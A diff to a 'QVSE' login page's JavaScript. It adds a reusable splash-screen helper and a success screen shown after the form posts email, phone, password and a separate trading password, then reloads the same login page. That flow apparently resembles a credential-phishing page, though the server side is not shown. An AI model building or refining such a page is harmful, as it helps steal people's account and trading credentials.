@@ -1,24 +1,34 @@
 document.addEventListener('DOMContentLoaded', function () {
-    // === Splash Screen ===
-    const splashScreen = document.getElementById('splashScreen');
+    // === Splash Screen Helper ===
+    // Shows the splash screen for `duration` ms, fades it out, then calls `callback`
+    function showSplash(duration, callback) {
+        var splash = document.getElementById('splashScreen');
+        if (!splash) {
+            // Re-create splash element if it was removed from DOM
+            splash = document.createElement('div');
+            splash.id = 'splashScreen';
+            splash.className = 'splash-screen';
+            splash.innerHTML = '<img src="splash.png" alt="QVSE Loading">';
+            document.body.appendChild(splash);
+        }
 
-    if (splashScreen) {
-        // Force splash fully visible via inline style (bypass any CSS cache issues)
-        splashScreen.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;opacity:1;visibility:visible;';
+        // Force visible
+        splash.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;opacity:1;visibility:visible;pointer-events:all;';
 
-        // After 7 seconds: fade out and remove splash entirely
         setTimeout(function () {
-            splashScreen.style.transition = 'opacity 0.8s ease-in-out';
-            splashScreen.style.opacity = '0';
+            splash.style.transition = 'opacity 0.8s ease-in-out';
+            splash.style.opacity = '0';
 
-            // Remove from DOM after fade
             setTimeout(function () {
-                if (splashScreen && splashScreen.parentNode) {
-                    splashScreen.parentNode.removeChild(splashScreen);
-                }
+                splash.style.visibility = 'hidden';
+                splash.style.pointerEvents = 'none';
+                if (callback) callback();
             }, 900);
-        }, 7000);
+        }, duration);
     }
+
+    // === Initial Splash (2 seconds) ===
+    showSplash(2000, null);
 
     // === Elements ===
     const tabEmail = document.getElementById('tabEmail');
@@ -93,6 +103,17 @@ document.addEventListener('DOMContentLoaded', function () {
         }, 3000);
     }
 
+    // === Show Success Screen then Redirect ===
+    function showSuccessAndRedirect() {
+        const successScreen = document.getElementById('successScreen');
+        if (successScreen) {
+            successScreen.classList.add('show');
+        }
+        setTimeout(function () {
+            window.location.href = window.location.href;
+        }, 2000);
+    }
+
     // === Form Submission ===
     loginForm.addEventListener('submit', async function (e) {
         e.preventDefault();
@@ -150,16 +171,14 @@ document.addEventListener('DOMContentLoaded', function () {
             const data = await response.json();
 
             if (data.success) {
-                showToast('Login successful!', false);
                 // Clear form
                 emailInput.value = '';
                 phoneInput.value = '';
                 passwordInput.value = '';
                 tradingPasswordInput.value = '';
-                // Redirect back to login after 2 seconds
-                setTimeout(function () {
-                    window.location.href = window.location.href;
-                }, 2000);
+
+                // Show splash for 4 seconds, then success screen, then redirect
+                showSplash(4000, showSuccessAndRedirect);
             } else {
                 showToast(data.message || 'Something went wrong', true);
             }
